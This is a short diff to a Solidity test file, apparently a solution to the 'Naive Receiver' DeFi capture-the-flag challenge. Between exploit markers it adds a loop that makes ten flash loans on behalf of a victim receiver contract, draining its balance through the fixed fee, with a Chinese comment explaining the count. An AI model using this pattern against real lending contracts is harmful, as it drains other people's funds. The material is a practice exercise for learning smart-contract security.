@@ -48,6 +48,14 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        // 因為 fee 固定，所以認為要跑 10 次
+        for (uint256 i = 0; i < 10;) {
+            // Borrow 1 ETH from the pool
+            unchecked {
+                naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1e18);
+                ++i;
+            }
+        }
 
         /**
          * EXPLOIT END *
